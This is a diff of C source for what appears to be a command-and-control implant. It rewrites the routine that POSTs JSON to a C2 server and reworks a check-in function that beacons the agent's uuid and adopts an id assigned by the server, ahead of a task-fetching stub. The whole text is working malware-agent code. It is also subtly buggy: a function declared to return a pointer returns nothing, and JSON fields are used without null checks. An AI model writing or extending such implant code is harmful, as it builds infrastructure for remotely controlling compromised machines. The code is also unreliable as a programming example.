@@ -72,15 +72,15 @@ char* send_c2_post_request(char* json_data) {
     const char* headers = "Content-Type: application/json\r\n";
     
     if (HttpSendRequest(hRequest, headers, -1, json_data, strlen(json_data))) {
-        printf("wyslano.\n");
+        printf("wysłano post'a\n");
         
         char buffer[1024];
         DWORD bytesRead;
         if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
-            buffer[bytesRead] = '\0';
-            //printf("Odpowiedź serwera: %s\n", buffer);
-            //snprintf(json_data,sizeof(buffer),buffer)
-            return buffer;
+            char* response = (char*)malloc(bytesRead+1);
+            memcpy(response,buffer,bytesRead);
+            response[bytesRead] = '\0';
+            return response;
         }
     }
 
@@ -88,16 +88,22 @@ char* send_c2_post_request(char* json_data) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 }
-bool checkin(){
-        char json_checkin_buff[150];
-    snprintf(json_buff,sizeof(json_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
-    json_buff = send_c2_post_request(json_buff); //checkin do serwera
-    cJSON *root = cJSON_Parse(json_buff);
-    if (*root){
+char* checkin(){
+        char json_checkin_buff[190];
+    snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
+    char* resp = send_c2_post_request(json_checkin_buff); //checkin do serwera
+    cJSON *root = cJSON_Parse(resp);
+    if (root !=NULL){
         cJSON *status = cJSON_GetObjectItemCaseSensitive(root, "status");
         cJSON *id = cJSON_GetObjectItemCaseSensitive(root, "id");
-        cJSON *session_id = cJSON_GetObjectItemCaseSensitive(root, "session_id");
+        cJSON *action = cJSON_GetObjectItemCaseSensitive(root, "action");
+        if(strcmp(status->valuestring,"success") == 0 && cJSON_IsString(id) && !strcmp(action->valuestring,"checkin")){
+            strncpy(config.uuid,id->valuestring,sizeof(config.uuid) - 1);
+        }
+
     }
+    free(resp);
+    cJSON_Delete(root);
 }
 	
 void get_tasks(){
